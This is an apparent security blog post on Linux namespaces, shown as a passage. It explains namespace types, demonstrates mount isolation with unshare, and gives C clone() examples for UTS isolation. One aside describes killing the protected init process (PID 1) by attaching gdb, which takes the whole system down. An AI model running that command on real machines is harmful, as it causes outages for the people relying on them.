<!DOCTYPE html>
<html lang="zh-CN,en,default">
  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1'>
  <meta charset="utf-8">
  <!-- SEO相关 -->
  
    
  
  <!-- 渲染优化 -->
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <link rel="preload" href="/css/first.css" as="style">
  

  <!-- 页面元数据 -->
  
  <title>Linux命名空间机制及其隔离不当导致的漏洞 - TARI TARI</title>
  
    <meta name="keywords" content="云安全,Docker,Linux命名空间">
  

  

  <!-- feed -->
  

  <!-- import meta -->
  

  <!-- link -->
  
    <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/favicon.ico">
  

  <!-- import link -->
  

  
    
<link rel="stylesheet" href="/css/first.css">

  

  
  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
  

  <script id="loadcss"></script>

  
<script>
if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
    document.write(
	'<style>'+
		'html{'+
			'overflow-x: hidden !important;'+
			'overflow-y: hidden !important;'+
		'}'+
		'.kill-ie{'+
			'text-align:center;'+
			'height: 100%;'+
			'margin-top: 15%;'+
			'margin-bottom: 5500%;'+
		'}'+
	'</style>'+
    '<div class="kill-ie">'+
        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
        '<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support"><strong>了解详情 ></strong></a>'+
    '</div>');
</script>


<noscript>
	<style>
		html{
			overflow-x: hidden !important;
			overflow-y: hidden !important;
		}
		.kill-noscript{
			text-align:center;
			height: 100%;
			margin-top: 15%;
			margin-bottom: 5500%;
		}
	</style>
    <div class="kill-noscript">
        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>了解详情 ></strong></a>
    </div>
</noscript>

</head>

  <body>
    

<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
  <div class='container'>
  <div id='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/'>
          
          
          
            TARI TARI
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h m-pc'>
          
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-home fa-fw'></i>主页
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
          
				</ul>
			</div>

      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fas fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="搜索..." />
        </form>
      </div>

			<ul class='switcher nav-list-h m-phone'>
				
					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
				
				<li>
          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-home fa-fw'></i>主页
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
            
          </ul>
        </li>
			</ul>
		</div>
	</div>
  </div>
</header>

    <div id="l_body">
      <div id="l_cover">
  
    
        <div id="full" class='cover-wrapper post dock' style="display: none;">
          
            <div class='cover-bg lazyload placeholder' data-bg="/img/home.jpeg"></div>
          
          <div class='cover-body'>
  <div class='top'>
    
    
      <p class="title">TARI TARI</p>
    
    
      <p class="subtitle">记录信安路上的点滴 (:</p>
    
  </div>
  <div class='bottom'>
    <div class='menu navigation'>
      <div class='list-h'>
        
      </div>
    </div>
  </div>
</div>

          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
        </div>
    
  
  </div>

      <div id="safearea">
        <div class="body-wrapper" id="pjax-container">
          

<div class='l_main'>
  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
  


  
  <div class="article-meta" id="top">
    
    
    
      <h1 class="title">
        Linux命名空间机制及其隔离不当导致的漏洞
      </h1>
      <div class='new-meta-box'>
        
          
            <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：2022年12月25日 09:34</p>
  </a>
</div>

          
        
          
            <div class="new-meta-item date" itemprop="dateUpdated" datetime="2022-12-25T10:26:19+08:00">
  <a class='notlink'>
    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
    <p>更新于：2022年12月25日 10:26</p>
  </a>
</div>

          
        
          
            
  <div class="new-meta-item browse leancloud">
    <a class='notlink'>
      
      <div id="lc-pv" data-title="Linux命名空间机制及其隔离不当导致的漏洞" data-path="/p/2022/linux-namespace/">
        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
        次浏览
      </div>
    </a>
  </div>


          
        
          
            
  <div class="new-meta-item wordcount">
    <a class='notlink'>
      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
      <p>字数：9.6k字</p>
    </a>
  </div>
  <div class="new-meta-item readtime">
    <a class='notlink'>
      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
      <p>时长：45分钟</p>
    </a>
  </div>


          
        
      </div>
    
  </div>


  
  
  <p><del>最近</del>（其实年中的时候写好了，一直忘了发出来..）在学习云和容器相关的知识，经过复现几个漏洞和DEBUG Docker 各个部件的源码发现在Linux底层是依靠Linux命名空间和Cgroups对资源进行隔离，这里打算深入学习一下Linux底层知识。</p>
<h2 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h2><p>Linux命名空间灵感源自Unix系统命名空间功能，从2002年2.4.19内核版本开始集成至Linux中，Linux内核3.8中引入用户命名空间提供了足够容器支持功能，并逐步发展至今，</p>
<h2 id="命令空间类型"><a href="#命令空间类型" class="headerlink" title="命令空间类型"></a>命令空间类型</h2><p>Linux 内核经过迭代版本变更共提供 8 种命名空间（表1）</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">功能说明</th>
<th align="center">内核</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Mount (mnt)</td>
<td align="center">挂载点和文件系统隔离</td>
<td align="center">2.4.19<sup>[2]</sup></td>
</tr>
<tr>
<td align="center">UTS</td>
<td align="center">主机名隔离</td>
<td align="center">2.6.19<sup>[3]</sup></td>
</tr>
<tr>
<td align="center">Interprocess Communication (ipc)</td>
<td align="center">进程间通信隔离</td>
<td align="center">2.6.19<sup>[4]</sup></td>
</tr>
<tr>
<td align="center">Process ID (pid)</td>
<td align="center">进程隔离</td>
<td align="center">2.6.24<sup>[5]</sup></td>
</tr>
<tr>
<td align="center">Network (net)</td>
<td align="center">网络隔离</td>
<td align="center">2.6.29<sup>[6]</sup></td>
</tr>
<tr>
<td align="center">User ID (user)</td>
<td align="center">用户隔离</td>
<td align="center">3.8<sup>[7]</sup></td>
</tr>
<tr>
<td align="center">Control group (cgroup)</td>
<td align="center">系统资源使用隔离</td>
<td align="center">4.6<sup>[8]</sup></td>
</tr>
<tr>
<td align="center">Time Namespace</td>
<td align="center">系统时间隔离</td>
<td align="center">5.6<sup>[9]</sup></td>
</tr>
</tbody></table>
<ul>
<li>进程命名空间是嵌套的，即当一个进程被创建时，从其当前命名空间到其初始化命名空间，每个命名空间都有一个pid，而且有个规律：子进程的pid比父进程的小。</li>
</ul>
<p><img src="/img/linux-namespace/0cd4986f1afc5990f622fe50c58db42df5b01618.png" class="lazyload" data-srcset="/img/linux-namespace/0cd4986f1afc5990f622fe50c58db42df5b01618.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5579"></p>
<ul>
<li>pid 还有一个比较有意思的知识，Linux 系统中 pid 为 1 是系统启动后创建的第1个进程，或者叫 init process，它有一个特征是 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Orphan_process">orphaned processes</a> 孤立进程附加到这上面，也就是说，如果 pid 1 被 kill 后，他立刻会终结附加到其上的所有子进程，不过默认 pid 1 是被保护起来的，无法正常通过 <code>kill -9 1</code> 等 kill 操作杀死，以保证操作系统的稳定运行，不过可以通过 gdb[10] 来干掉：<code>gdb -p 1</code> 后执行 <code>kill</code></li>
<li>pid 这里有一个大家可能已用过的案例，即WSL无法使用systemctl的解决方案，因为WSL初始PID不是1，所以用不了，通过把自己隔离让自己看到自己的PID为1</li>
<li>User ID (user) 提供的用户隔离正是容器化的开始，因为他可以摒弃传统的用户权限分级和控制手段。比如一个命名空间内，可以让其认为自己是 root (uid=0)，但实际上 uid是1400000，用户命名空间也是嵌套的</li>
<li>Control group (cgroup) 比如限制某个容器能使用几个CPU，多少内存的特性就是因为这个命名空间</li>
<li>其中 Network 和 User 在Linux 2.6.24 和 2.6.23 已有，到表中记录版本才完善</li>
</ul>
<p>确认当前 bash进程的PID 和 各个namespace，中括号内为 namespace 编号</p>
<p><img src="/img/linux-namespace/b28746495094fca4830b7abc7f745452b49e4e59.png" class="lazyload" data-srcset="/img/linux-namespace/b28746495094fca4830b7abc7f745452b49e4e59.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5554"></p>
<p>实现命名空间主要是3个系统调用</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/clone.2.html">clone()</a> 实现线程的系统调用，用来创建一个新的进程，并可以通过设置命名空间类型参数达到隔离。</li>
<li><code>unshare()</code> 使某进程脱离某个namespace</li>
<li><code>setns()</code> 把某进程加入到某个namespace</li>
</ul>
<h2 id="mnt隔离-11"><a href="#mnt隔离-11" class="headerlink" title="mnt隔离[11]"></a>mnt隔离<sup>[11]</sup></h2><h3 id="没有隔离的mount"><a href="#没有隔离的mount" class="headerlink" title="没有隔离的mount"></a>没有隔离的mount</h3><blockquote>
<p>为了简单起见使用tmpfs这种基于内存的文件系统来模拟</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $$</span><br><span class="line">mkdir /tmp/noisolation</span><br><span class="line">mount -t tmpfs tmpfs /tmp/noisolation/</span><br><span class="line"><span class="built_in">cd</span> /tmp/noisolation/</span><br><span class="line">touch aaa bbb ccc ddd</span><br><span class="line">ll</span><br></pre></td></tr></table></figure>

<p><img src="/img/linux-namespace/64a869eecfd3f61335a4f4411281d7a7109e8e7e.png" class="lazyload" data-srcset="/img/linux-namespace/64a869eecfd3f61335a4f4411281d7a7109e8e7e.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5556"></p>
<p>新起一个 bash，文件存在</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@cloud_shoot:~<span class="comment"># echo $$</span></span><br><span class="line">20434</span><br><span class="line">root@cloud_shoot:~<span class="comment"># ll /tmp/noisolation/</span></span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwt  2 root root  120 May 26 09:36 ./</span><br><span class="line">drwxrwxrwt 10 root root 4096 May 26 09:38 ../</span><br><span class="line">-rw-r--r--  1 root root    0 May 26 09:36 aaa</span><br><span class="line">-rw-r--r--  1 root root    0 May 26 09:36 bbb</span><br><span class="line">-rw-r--r--  1 root root    0 May 26 09:36 ccc</span><br><span class="line">-rw-r--r--  1 root root    0 May 26 09:36 ddd</span><br></pre></td></tr></table></figure>

<h3 id="有隔离的-mount"><a href="#有隔离的-mount" class="headerlink" title="有隔离的 mount"></a>有隔离的 mount</h3><p>先创建个测试目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/isolation</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Linux内核也提供系统函数实现<sup>[12]</sup>，这里直接使用Linux unshare命令实现隔离</p>
</blockquote>
<p>使用 <code>unshare</code> 隔离 mnt namespace</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $$</span><br><span class="line">unshare --mount /bin/bash</span><br><span class="line"><span class="built_in">echo</span> $$</span><br></pre></td></tr></table></figure>

<p><img src="/img/linux-namespace/b72763ed1a7ff6795860ea5a280242c781e267b8.png" class="lazyload" data-srcset="/img/linux-namespace/b72763ed1a7ff6795860ea5a280242c781e267b8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5558"></p>
<p>可以清楚看到两个进程为父子进程关系.<code>20516</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep 20516 | grep -v grep</span><br><span class="line">pstree -p | grep 20526</span><br></pre></td></tr></table></figure>

<p><img src="/img/linux-namespace/3b81b9d4a9bfa4ed4dc2e8f9a31c5a484e3329e4.png" class="lazyload" data-srcset="/img/linux-namespace/3b81b9d4a9bfa4ed4dc2e8f9a31c5a484e3329e4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5560"></p>
<p>在 <code>20526</code> 即隔离 namespace 中挂载 tmpfs 目录和文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $$</span><br><span class="line">mount -t tmpfs tmpfs /tmp/isolation</span><br><span class="line"><span class="built_in">cd</span> /tmp/isolation/</span><br><span class="line">touch aaa bbb ccc ddd</span><br><span class="line">ll</span><br></pre></td></tr></table></figure>

<p><img src="/img/linux-namespace/5646203d43abb13019d43cfea3b9dd0a6513e901.png" class="lazyload" data-srcset="/img/linux-namespace/5646203d43abb13019d43cfea3b9dd0a6513e901.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5562"></p>
<p>查看该 namespace 的编号，发现只有 mnt 改变了</p>
<p><img src="/img/linux-namespace/be901d3eb62163fbdb0be58072ddb4a924f6dc6d.png" class="lazyload" data-srcset="/img/linux-namespace/be901d3eb62163fbdb0be58072ddb4a924f6dc6d.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5564"></p>
<p>在新起的终端确认 <code>/tmp/isolation</code> 文件内容，文件不存在</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /tmp/isolation/</span><br></pre></td></tr></table></figure>

<p><img src="/img/linux-namespace/42ff18b043d103b21d56caaf2fc1ae46b3264d25.png" class="lazyload" data-srcset="/img/linux-namespace/42ff18b043d103b21d56caaf2fc1ae46b3264d25.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5566"></p>
<p>那其他命名空间呢？</p>
<h2 id="C实现命名空间隔离实验-13-14"><a href="#C实现命名空间隔离实验-13-14" class="headerlink" title="C实现命名空间隔离实验[13] [14]"></a>C实现命名空间隔离实验<sup>[13] [14]</sup></h2><h3 id="clone-系统调用"><a href="#clone-系统调用" class="headerlink" title="clone()系统调用"></a>clone()系统调用</h3><p>clone.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个给 clone 用的栈，栈大小1M */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container - inside the container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 直接执行一个shell，以便我们观察这个进程空间里的资源是否被隔离了 */</span></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - start a container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */</span></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 等待子进程结束 */</span></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接启用通过execv启用一个子进程，到新的 /bin/bash 环境，这里没做任何隔离，父进程能做的子进程基本都可以做</p>
<h2 id="UTS-Namespace"><a href="#UTS-Namespace" class="headerlink" title="UTS Namespace"></a>UTS Namespace</h2><p>可通过 clone() 函数设置 <code>CLONE_NEWUTS</code> 标志位实现，需要 root 权限<br>uts_ns.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个给 clone 用的栈，栈大小1M */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container - inside the container!\n&quot;</span>);</span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>); <span class="comment">/* 设置hostname */</span></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - start a container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */</span></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 等待子进程结束 */</span></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>子进程运行 <code>hostname</code> 查看主机名变成 container, 宿主机不变，这里注意如果是用 <code>hostnamectl sethostname &lt;xxx&gt;</code> 命令会改变宿主机的 hostname，因为这个命令是通过写文件实现的，这里并未做文件隔离</p>
<h3 id="IPC-Mamespace"><a href="#IPC-Mamespace" class="headerlink" title="IPC Mamespace"></a>IPC Mamespace</h3><p>可通过 clone() 函数设置 <code>CLONE_NEWIPC</code> 标志位实现，需要 root 权限</p>
<p>ipc.c</p>
